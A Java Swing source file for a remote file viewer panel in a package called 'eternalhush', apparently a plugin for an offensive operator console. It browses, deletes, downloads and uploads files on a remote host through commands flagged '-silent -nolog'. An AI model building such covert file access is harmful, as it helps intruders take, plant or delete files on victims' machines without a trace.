package eternalhush.plugin.remotefileviewer;

import eternalhush.console.CommandHandler;
import eternalhush.console.ConsoleManager;
import eternalhush.console.OperationConsole;
import eternalhush.events.ConsoleEventListener;
import eternalhush.events.ConsoleEventSource;
import eternalhush.gui.IconLoader;
import eternalhush.gui.NativeFileDialog;
import eternalhush.gui.OperationPane;
import eternalhush.gui.PopMenuItem;
import eternalhush.main.GlobalVariables;
import eternalhush.manager.MetaInfo;
import eternalhush.userinterface.MessagesConstants;
import eternalhush.userinterface.UserInterface;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.*;
import java.io.File;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.UUID;

public class RFWFileTable extends JPanel {
    OperationConsole linkedInstance = null;
    String xml_name = null;
    FileListingParser parser;
    JTable j;
    JTextField remoteDirectory;
    JPanel RFWBar;
    IconLoader iconLoader;
    JButton backBtn;
    JButton fwdBtn;
    JButton reloadBtn;
    ArrayList<String> fwdList;
    ArrayList<String> backList;
    ImageIcon typeFile;
    ImageIcon typeDirectory;
    String tempPath;

    NativeFileDialog fileChooser;

    JPopupMenu popupMenu;
    JPopupMenu emptyPlacePopupMenu;
    PopMenuItem deleteItem;
    PopMenuItem downloadItem;
    PopMenuItem newDirItem;
    PopMenuItem uploadItem;

    public RFWFileTable(OperationConsole console) {
        setLayout(new BorderLayout());

        fwdList = new ArrayList<>();
        backList = new ArrayList<>();

        RFWBar = new JPanel();
        GroupLayout barLayout = new GroupLayout(RFWBar);
        RFWBar.setLayout(barLayout);

        iconLoader = new IconLoader();
        remoteDirectory = new JTextField();

        fileChooser = new NativeFileDialog();
        typeDirectory = iconLoader.loadIcon("images/folder.png",this.getClass(),17,17);
        typeFile = iconLoader.loadIcon("images/file.png",this.getClass(),17,17);

        deleteItem = new PopMenuItem("Delete", iconLoader.loadIcon("images/delete.png",this.getClass(),17,17));
        downloadItem = new PopMenuItem("Download", iconLoader.loadIcon("images/download.png",this.getClass(),17,17));
        uploadItem = new PopMenuItem("Upload", iconLoader.loadIcon("images/upload.png",this.getClass(),17,17));
        newDirItem = new PopMenuItem("New Directory", iconLoader.loadIcon("images/add_directory.png",this.getClass(),17,17));

        backBtn = new JButton(iconLoader.loadIcon("images/back.png",this.getClass(),17,17));
        fwdBtn = new JButton(iconLoader.loadIcon("images/forward.png",this.getClass(),17,17));
        reloadBtn = new JButton(iconLoader.loadIcon("images/reload.png",this.getClass(),17,17));
        reloadBtn.setOpaque(false);
        reloadBtn.setContentAreaFilled(false);
        reloadBtn.setBorderPainted(false);
        reloadBtn.setFocusPainted(false);

        fwdBtn.setOpaque(false);
        fwdBtn.setContentAreaFilled(false);
        fwdBtn.setBorderPainted(false);
        fwdBtn.setFocusPainted(false);

        backBtn.setOpaque(false);
        backBtn.setContentAreaFilled(false);
        backBtn.setBorderPainted(false);
        backBtn.setFocusPainted(false);


        barLayout.setHorizontalGroup(barLayout.createSequentialGroup()
             //   .addContainerGap(100, 30000)
                .addGroup(barLayout.createParallelGroup()
                        .addComponent(backBtn)
                )
                .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(barLayout.createParallelGroup()
                        .addComponent(fwdBtn)
                )
                .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(barLayout.createParallelGroup()
                        .addComponent(reloadBtn)
                )
                .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(barLayout.createParallelGroup()
                        .addComponent(remoteDirectory)
                )
              //  .addContainerGap(100, 30000)
        );
        barLayout.setVerticalGroup(barLayout.createSequentialGroup()
                .addGap(10)
                .addGroup(barLayout
                        .createParallelGroup(GroupLayout.Alignment.BASELINE)
                        .addComponent(backBtn)
                        .addComponent(fwdBtn)
                        .addComponent(reloadBtn)
                        .addComponent(remoteDirectory)
                )
                .addGap(10)
        );

        newDirItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                String filename = JOptionPane.showInputDialog(null, "Enter New Directory Name");
                if (filename.contains(">") ||
                        filename.contains("<") ||
                        filename.contains(":") ||
                        filename.contains("|") ||
                        filename.contains("/") ||
                        filename.contains("?") ||
                        filename.contains("\"")
                ){
                    JOptionPane.showMessageDialog(null, "Invalid Directory Name", "Error", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                String directory = remoteDirectory.getText();
                String old_dir = directory;
                if (directory.endsWith("\\") || directory.endsWith("/")) {
                    directory += filename;
                } else {
                    directory += "\\" + filename;
                }
                new CommandHandler().CommonHandler(String.format("!mkdir -path \"%s\" -silent -nolog", directory), "clsp", linkedInstance, 0);
                reparse(old_dir);
            }
        });
        deleteItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                int selected_row[] = j.getSelectedRows();
                String old_dir = remoteDirectory.getText();
                for (int value : selected_row) {
                    String filename = (String) j.getValueAt(value, 1);
                    String directory = remoteDirectory.getText();
                    if (directory.endsWith("\\") || directory.endsWith("/")) {
                        directory += filename;
                    } else {
                        directory += "\\" + filename;
                    }
                    new CommandHandler().CommonHandler(String.format("!delete -path \"%s\" -silent -nolog", directory), "clsp", linkedInstance, 0);
                }
                reparse(old_dir);
            }
        });
        downloadItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                int selected_row[] = j.getSelectedRows();
                String old_dir = remoteDirectory.getText();
                for (int value : selected_row) {
                    String filename = (String) j.getValueAt(value, 1);
                    String directory = remoteDirectory.getText();
                    if (directory.endsWith("\\") || directory.endsWith("/")) {
                        directory += filename;
                    } else {
                        directory += "\\" + filename;
                    }
                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_HHmmss_");
                    String timestamp = dateFormat.format(new Date());
                    String out_name = GlobalVariables.OperationConf.operPath +"\\storage\\"+ "DOWNLOAD_"+timestamp+filename;
                    new CommandHandler().CommonHandler(String.format("!get -src \"%s\" -out \"%s\" -silent -nolog", directory, out_name), "clsp", linkedInstance, 0);
                }
                JOptionPane.showMessageDialog(null, "Download Finished (check operation storage)");
            }
        });
        uploadItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                fileChooser.setDialogTitle("Choose Files To Upload");
                fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
                fileChooser.setMultiSelectionEnabled(true);
                int result = fileChooser.showOpenDialog(RFWFileTable.this);
                if (result == JFileChooser.APPROVE_OPTION){
                        File files[] = fileChooser.getSelectedFiles();
                        for (File f : files){
                            String filename = f.getName();
                            String directory = remoteDirectory.getText();
                            if (directory.endsWith("\\") || directory.endsWith("/")) {
                                directory += filename;
                            } else {
                                directory += "\\" + filename;
                            }
                            new CommandHandler().CommonHandler(String.format("!put -src \"%s\" -out \"%s\" -silent -nolog", f.getAbsolutePath(), directory), "clsp", linkedInstance, 0);
                        }
                        JOptionPane.showMessageDialog(null, "Upload Finished");
                        reparse(remoteDirectory.getText());
                }
            }
        });
        reloadBtn.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                SwingUtilities.invokeLater(new Runnable() {
                    @Override
                    public void run() {
                        String rpath = remoteDirectory.getText();
                        if (rpath.length() == 0){
                            reparse(null);
                        }else{
                            reparse(rpath);
                        }
                    }
                });
            }
        });

        backBtn.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                if(backList.isEmpty()) return;
                fwdList.add(remoteDirectory.getText());
                String old_path = backList.get(backList.size()-1);
                backList.remove(backList.size()-1);
                remoteDirectory.setText(old_path);
                reparse(old_path);
            }
        });
        fwdBtn.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent actionEvent) {
                if(fwdList.isEmpty()) return;
                backList.add(remoteDirectory.getText());
                String old_path = fwdList.get(fwdList.size()-1);
                fwdList.remove(fwdList.size()-1);
                remoteDirectory.setText(old_path);
                reparse(old_path);
            }
        });

        remoteDirectory.addKeyListener(new KeyListener() {
            @Override
            public void keyTyped(KeyEvent keyEvent) {

            }

            @Override
            public void keyPressed(KeyEvent keyEvent) {
                if (keyEvent.getKeyCode() == KeyEvent.VK_ENTER){
                    backList.add(tempPath);
                    tempPath = remoteDirectory.getText();
                    reparse(remoteDirectory.getText());
                }
            }

            @Override
            public void keyReleased(KeyEvent keyEvent) {

            }
        });
        xml_name = "TEMP_FILE_LISTING_"+UUID.randomUUID().toString()+".xml";
        linkedInstance = console;
        j = new JTable(){
            private static final long serialVersionUID = 1L;

            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        j.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent me) {
                if (me.getClickCount() == 2 && SwingUtilities.isLeftMouseButton(me)) {
                    JTable target = (JTable)me.getSource();
                    int row = target.getSelectedRow();
                    String filename = (String)j.getValueAt(row, 1);
                    String directory = remoteDirectory.getText();
                    if (directory.endsWith("\\") || directory.endsWith("/"))
                    {
                        directory += filename;
                    }else{
                        directory += "\\" + filename;
                    }

                    for (FileListingParser.FileEntry e: parser.getResult().FileEntry){
                        if (e.fileType.equals("file") && Paths.get(e.fileName).getFileName().toString().equals(filename)) {
                            return;
                        }
                    }

                    backList.add(remoteDirectory.getText());
                    remoteDirectory.setText(directory);
                    reparse(directory);
                }
            }
            @Override
            public void mouseReleased(MouseEvent e) {
                if (e.isPopupTrigger()){
                    int row = j.rowAtPoint( e.getPoint() );
                    int column = j.columnAtPoint( e.getPoint() );

                        if (!j.isRowSelected(row)) j.changeSelection(row, column, false, false);
                        popupMenu = new JPopupMenu();
                        popupMenu.add(deleteItem);
                        popupMenu.add(downloadItem);
                        popupMenu.show(e.getComponent(), e.getX(), e.getY());
                }
            }
        });

        JScrollPane jScrollPane = new JScrollPane(j);
        jScrollPane.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseReleased(MouseEvent e) {
                if(e.isPopupTrigger()) {
                    emptyPlacePopupMenu = new JPopupMenu();
                    emptyPlacePopupMenu.add(uploadItem);
                    emptyPlacePopupMenu.add(newDirItem);
                    emptyPlacePopupMenu.show(e.getComponent(), e.getX(), e.getY());
                }
            }
        });
        add(jScrollPane, BorderLayout.CENTER);
        add(RFWBar, BorderLayout.NORTH);
        this.addComponentListener(new ComponentAdapter() {
            @Override
            public void componentShown(ComponentEvent e) {
                reparse(remoteDirectory.getText());
            }
        });
    }
    void setColumnsSize(){
        j.getColumnModel().getColumn(0).setMaxWidth(30);
        j.getColumnModel().getColumn(1).setMaxWidth(1000);
        j.getColumnModel().getColumn(2).setMaxWidth(300);
        j.getColumnModel().getColumn(3).setMaxWidth(200);
        j.getColumnModel().getColumn(4).setMaxWidth(70);
        j.getColumnModel().getColumn(5).setMaxWidth(70);
        j.getColumnModel().getColumn(6).setMaxWidth(70);

    }

    public void reparse(String path){
        String[] columnNames = { "", "Name", "Date", "Size", "Access", "System", "Hidden" };
        DefaultTableModel daDefaultTableModel = new DefaultTableModel(0, 0){
            @Override
            public Class<?> getColumnClass(int column) {
                Class<?> returnValue;
                if (column == 0) {
                    returnValue = ImageIcon.class;
                }
                else if(column > 0 && column <= columnNames.length-1){
                    returnValue = String.class;
                }
                else {
                    returnValue = Object.class;
                }
                return returnValue;
            }

        };
        daDefaultTableModel.setColumnIdentifiers(columnNames);
        String path_arg = "";
        if (path != null) path_arg = String.format("-path \"%s\"", path);
        new CommandHandler().CommonHandler(String.format("!dir %s -xmlout %s -silent -nolog", path_arg, GlobalVariables.OperationConf.operPath + "\\storage\\"+xml_name), "clsp", linkedInstance, 0);
        parser = new FileListingParser(GlobalVariables.OperationConf.operPath + "\\storage\\"+xml_name);
        boolean initPath = false;
        String initPathString;
        for (FileListingParser.FileEntry e: parser.getResult().FileEntry){
            ImageIcon typeIcon;
            if(!initPath && path == null) {
                initPathString = Paths.get(e.fileName).getParent().toString();
                remoteDirectory.setText(initPathString);
                tempPath = initPathString;
                initPath = true;
            }
            if (e.fileType.equals("directory")) {
                e.fileSize = "";
                typeIcon = typeDirectory;
            }else {
                typeIcon = typeFile;
            }
            daDefaultTableModel.addRow(new Object[]{typeIcon, Paths.get(e.fileName).getFileName().toString(), e.fileTimestamp, e.fileSize, e.fileAccess, e.fileIsSystem, e.fileIsHidden});
        }
        new File(GlobalVariables.OperationConf.operPath + "\\storage\\"+xml_name).delete();
        j.setModel(daDefaultTableModel);
        j.setRowHeight(20);
        setColumnsSize();
    }
}
